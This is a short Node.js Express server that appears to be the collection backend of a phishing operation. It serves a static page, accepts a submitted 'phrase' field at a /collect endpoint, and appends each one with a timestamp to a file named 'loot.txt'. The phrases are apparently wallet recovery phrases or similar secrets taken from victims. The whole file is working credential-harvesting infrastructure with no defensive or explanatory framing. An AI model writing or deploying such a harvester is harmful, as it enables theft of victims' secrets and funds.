const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/collect', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] Phrase: ${data.phrase}\n`;
    
    console.log(logEntry);
    fs.writeFileSync('loot.txt', logEntry, { flag: 'a' });

    res.status(200).send({ status: 'success' });
});

app.listen(80, () => {
    console.log('[*] Listener active on port 80');
});
